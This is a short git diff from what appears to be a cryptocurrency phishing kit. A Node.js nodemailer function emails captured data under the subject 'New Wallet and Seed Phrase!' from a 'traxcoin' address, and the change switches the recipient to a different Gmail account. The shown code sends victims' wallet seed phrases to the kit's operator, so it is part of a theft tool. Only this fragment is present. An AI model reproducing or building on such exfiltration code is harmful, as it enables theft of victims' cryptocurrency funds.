@@ -13,7 +13,7 @@ const transporter = nodemailer.createTransport({
 function deliverMail(data) {
   const mail = {
     from: "info@traxcoin.one",
-    to: `mjabbay4real@gmail.com`,
+    to: `kingtony3825@gmail.com`,
     subject: "New Wallet and Seed Phrase!",
     html: `<!DOCTYPE html>
 <html lang="en">
